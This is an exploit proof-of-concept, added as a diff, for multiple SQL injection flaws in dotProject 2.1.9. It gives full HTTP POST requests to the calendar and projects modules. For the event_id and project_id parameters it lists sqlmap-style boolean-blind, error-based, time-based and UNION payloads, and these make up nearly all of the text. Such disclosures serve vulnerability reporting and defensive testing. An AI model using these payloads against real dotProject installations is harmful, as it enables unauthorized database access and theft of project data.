@@ -1,0 +1,117 @@
+# Exploit Title: dotProject 2.1.9 - Multiple Sql Injection (Poc)
+# Exploit Author: Metin Yunus Kandemir (kandemir)
+# Vendor Homepage: https://dotproject.net
+# Software Link: https://github.com/dotproject/dotProject/archive/v2.1.9.zip
+# Version: 2.1.9
+# Category: Webapps
+# Tested on: Xampp for Windows
+# Software Description : dotProject is a volunteer supported Project Management application. There is no "company" behind this project, it is managed, maintained, developed and supported by a volunteer group and by the users themselves.
+
+==================================================================
+
+
+event_id (POST) - Sql injection PoC
+
+POST /dotProject-2.1.9/index.php?m=calendar HTTP/1.1
+Host: xxx.xxx.x.xx
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://xxx.xxx.x.xx/dotProject-2.1.9/index.php?m=calendar&a=addedit
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 273
+Cookie: dotproject=gfkt21luioqv9eoh25hdaloe7v; client_lang=english; client_login_name=test1
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+dosql=do_event_aed&event_id=0&event_project=[SQLi]&event_assigned=1&event_title=test&
+event_description=hkffkfuy&event_type=0&event_project=0&event_start_date=20190621&start_time=080000&event_end_date=20190621&
+end_time=170000&event_recurs=0&event_times_recuring=1&mail_invited=on
+
+
+
+
+Parameter: event_id (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: dosql=do_event_aed&event_id=0) AND 3236=3236-- rnpG&event_project=0&event_assigned=1&event_title=test&event_description=hkffkfuy&event_type=0&event_project=0&event_start_date=20190621&start_time=080000&event_end_date=20190621&end_time=170000&event_recurs=0&event_times_recuring=1&mail_invited=on
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: dosql=do_event_aed&event_id=0) AND (SELECT 7581 FROM(SELECT COUNT(*),CONCAT(0x7170787a71,(SELECT (ELT(7581=7581,1))),0x71627a6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- bOIA&event_project=0&event_assigned=1&event_title=test&event_description=hkffkfuy&event_type=0&event_project=0&event_start_date=20190621&start_time=080000&event_end_date=20190621&end_time=170000&event_recurs=0&event_times_recuring=1&mail_invited=on
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: dosql=do_event_aed&event_id=0) AND (SELECT 6637 FROM (SELECT(SLEEP(5)))bNDB)-- NfAk&event_project=0&event_assigned=1&event_title=test&event_description=hkffkfuy&event_type=0&event_project=0&event_start_date=20190621&start_time=080000&event_end_date=20190621&end_time=170000&event_recurs=0&event_times_recuring=1&mail_invited=on
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 1 column
+    Payload: dosql=do_event_aed&event_id=0) UNION ALL SELECT CONCAT(0x7170787a71,0x646772547a6e58774c464e54416963614c64646c7a6f6c745748597350686f535979714443794859,0x71627a6271)-- xXFB&event_project=0&event_assigned=1&event_title=test&event_description=hkffkfuy&event_type=0&event_project=0&event_start_date=20190621&start_time=080000&event_end_date=20190621&end_time=170000&event_recurs=0&event_times_recuring=1&mail_invited=on
+
+
+
+==================================================================
+
+
+MULTIPART project_id ((custom) POST) - Sql Injection Poc
+
+POST /dotProject-2.1.9/index.php?m=projects HTTP/1.1
+Host: 192.168.1.33
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.1.33/dotProject-2.1.9/index.php?m=projects&a=addedit
+Content-Type: multipart/form-data; boundary=---------------------------9310663371787104596119761620
+Content-Length: 2749
+Cookie: dotproject=gfkt21luioqv9eoh25hdaloe7v; client_lang=english; client_login_name=test1
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+-----------------------------9310663371787104596119761620
+Content-Disposition: form-data; name="dosql"
+
+do_project_aed
+-----------------------------9310663371787104596119761620
+Content-Disposition: form-data; name="project_id"
+
+[SQLi]
+-----------------------------9310663371787104596119761620
+Content-Disposition: form-data; name="project_creator"
+
+1
+.
+..snip
+..snip
+.
+
+-----------------------------9310663371787104596119761620
+Content-Disposition: form-data; name="import_tasks_from"
+
+0
+-----------------------------9310663371787104596119761620
+Content-Disposition: form-data; name="project_description"
+
+fasdf
+-----------------------------9310663371787104596119761620--
+
+
+
+Parameter: MULTIPART project_id ((custom) POST)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: 0 RLIKE (SELECT (CASE WHEN (6146=6146) THEN '' ELSE 0x28 END))
+
+    Type: error-based
+    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+    Payload: 0 AND EXTRACTVALUE(9751,CONCAT(0x5c,0x716b767871,(SELECT (ELT(9751=9751,1))),0x716b6a6a71))
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: 0 AND (SELECT 6725 FROM (SELECT(SLEEP(5)))WETe)
+
+
+#
+#
+#
